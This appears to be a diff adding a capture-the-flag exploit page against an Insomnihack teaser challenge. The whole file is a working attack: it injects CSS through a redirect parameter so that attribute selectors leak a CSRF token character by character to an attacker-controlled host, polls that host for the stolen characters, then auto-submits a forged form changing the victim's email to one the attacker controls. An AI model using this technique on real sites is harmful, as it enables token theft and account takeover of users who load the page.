@@ -1,0 +1,52 @@
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var token = '';
+function gen_src()
+{
+    src = 'http://css.teaser.insomnihack.ch/?page=login&redirect=%22%3E%3Clink%20rel=%22stylesheet%22%20href=%22?page=search%26search=%25%250a{}%250a'
+    //src='http://css.teaser.insomnihack.ch/?page=login&redirect="><link rel="stylesheet" href="?page=search&search=%%0a{}%0a'
+   
+    chars = "0123456789abcdef"
+    for(c = 0; c < 16; c++)
+        src += 'input[value^=%27'+token+chars[c]+'%27%20i]{background:url(%27http:%252f%252fcss.teaser.insomnihack.ch.cool.hacker.domain%252fsave%252f'+chars[c]+'%27);}%250a'
+    document.getElementById('ramek').src = src;
+    console.log(src);
+ 
+    $.ajax({
+    type: "GET",
+    url: "http://css.teaser.insomnihack.ch.cool.hacker.domain/get_token",
+    //async: false,
+        success: function (data) {
+            console.log(data);
+            token += data;
+            if(token.length < 32)
+            {
+                gen_src();
+                }
+            else
+            {
+                console.log(token);
+                document.getElementById('csrf').value=token;
+                document.getElementById('form').submit();
+            }
+        }
+        });
+}
+
+</script>
+</head>
+<body onload="gen_src()">
+<iframe id="ramek"></iframe>
+<form action="http://css.teaser.insomnihack.ch/?page=profile" method="POST" id="form">
+            <input type="text" name="name" value=""/>
+            <input type="text" name="age" value="31337"/>
+            <input type="text" name="country" value=""/>
+            <input type="text" name="email" value="EMAIL_WE_CONTROL"/>
+            <input type="hidden" name="csrf" value="" id="csrf"/>
+            <input type="hidden" name="change" value="Modify profile"/>
+        </tr>
+    </form>
+</body>
+</html>
